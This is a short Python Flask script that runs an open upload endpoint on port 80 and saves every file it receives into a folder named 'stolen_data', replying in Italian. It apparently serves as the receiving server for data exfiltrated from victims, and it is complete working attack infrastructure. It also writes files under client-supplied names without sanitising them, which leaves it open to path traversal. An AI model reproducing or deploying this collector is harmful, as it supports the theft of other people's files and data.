from flask import Flask, request

app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload_file():
    file = request.files['file']
    file.save(f"./stolen_data/{file.filename}")
    return "File ricevuto con successo!", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
